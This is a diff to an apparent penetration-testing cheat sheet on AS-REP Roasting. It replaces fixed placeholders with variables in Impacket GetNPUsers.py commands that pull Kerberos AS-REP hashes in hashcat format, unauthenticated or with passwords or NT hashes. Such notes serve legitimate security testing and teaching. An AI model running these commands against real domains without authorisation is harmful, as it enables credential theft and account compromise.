@@ -19,7 +19,7 @@ AS-REP Roasting targets **Kerberos user accounts** that have the `DONT_REQ_PREAU
 ### Get hashes from user wordlist (unauthenticated)
 
 ```bash
-GetNPUsers.py domain.lan/ -usersfile users.txt -dc-ip $DC_IP \
+GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP \
   -no-pass -request -format hashcat -outputfile asrep_hashes.txt
 ```
 
@@ -27,7 +27,7 @@ GetNPUsers.py domain.lan/ -usersfile users.txt -dc-ip $DC_IP \
 
 ```bash
 GetNPUsers.py -request -format hashcat -outputfile asrep_hashes.txt \
-  -dc-ip $DC_IP 'domain.local/'
+  -dc-ip $DC_IP '$DOMAIN/'
 ```
 
 ### 🔑 3. With valid credentials
@@ -35,16 +35,16 @@ GetNPUsers.py -request -format hashcat -outputfile asrep_hashes.txt \
 ```bash
 # Authenticated with cleartext credentials
 GetNPUsers.py -request -format hashcat -outputfile asrep_hashes.txt \
-  -dc-ip $DC_IP 'domain.local/user:password'
+  -dc-ip $DC_IP '$DOMAIN/$USER:$PASSWORD'
 
 # Authenticated with NTLM hash
 GetNPUsers.py -request -format hashcat -outputfile asrep_hashes.txt \
-  -hashes :NTLMHASH -dc-ip $DC_IP 'domain.local/user'
+  -hashes :$NT_HASH -dc-ip $DC_IP '$DOMAIN/$USER'
 ```
 
 ```bash
 # users list dynamically queried with a LDAP authenticated bind (NT hash)
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes ':$NT_HASH' -dc-ip $DC_IP '$DOMAIN/$USER'
 ```
 
 ### Windows
